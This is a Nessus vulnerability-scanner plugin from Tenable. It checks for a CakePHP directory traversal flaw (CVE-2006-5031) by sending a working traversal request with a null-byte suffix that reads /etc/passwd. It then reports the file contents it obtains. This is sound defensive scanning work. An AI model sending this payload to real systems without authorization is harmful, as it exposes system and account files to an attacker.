#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22448);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2006-5031");
  script_bugtraq_id(20150);
  script_osvdb_id(29055);

  script_name(english:"CakePHP vendors.php file Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file with CakePHP");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running CakePHP, an open source rapid development
framework for PHP. 

The version of CakePHP on the remote host allows directory traversal
sequences in the 'file' parameter of the 'js/vendors.php' script.  An
unauthenticated attacker may be able to leverage this flaw to view
arbitrary files on the remote host subject to the privileges of the
web server user id." );
  # http://web.archive.org/web/20061010145851/http://www.gulftech.org/?node=research&article_id=00114-09212006&
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d309f69a" );
  # http://web.archive.org/web/20110104214937/https://trac.cakephp.org/ticket/1429
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?baeaa24f" );
  # http://web.archive.org/web/20061011144255/http://cakeforge.org/frs/shownotes.php?group_id=23&release_id=134
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a4f701e6" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to CakePHP version 1.1.8.3544 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2006/09/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/09/21");
 script_cvs_date("$Date: 2013/01/04 22:50:31 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:cakefoundation:cakephp");
script_end_attributes();


  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
foreach dir (cgi_dirs()) {

  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../etc/passwd";
  u = string(dir, "/js/vendors.php?", "file=", file, "%00nessus.js" );
  r = http_send_recv3(method: "GET", port:port, item: u);
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    if (report_verbosity)
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}

